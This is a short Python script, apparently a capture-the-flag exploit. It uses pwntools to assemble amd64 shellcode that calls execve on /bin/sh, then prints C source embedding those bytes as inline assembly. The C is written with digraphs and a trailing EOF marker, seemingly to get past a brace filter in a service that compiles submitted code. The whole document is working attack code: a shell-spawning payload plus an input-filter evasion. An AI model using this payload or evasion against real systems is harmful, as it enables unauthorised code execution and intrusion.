from pwn import *

context.update(arch='amd64', os='linux')

shellcode = asm('''
    xor rdx, rdx                 
    movabs rax, 0x68732f6e69622f 
    push rax
    mov rdi, rsp                 
    push rdx                     
    push rdi                     
    mov rsi, rsp                 
    mov rax, 59                   
    syscall
''')

decimal_bytes = ",".join(str(b) for b in shellcode)
code = f"""
int main()
<%
    __asm__(
    {".byte {decimal_bytes}"}
    );
%>
EOF

"""
print(code)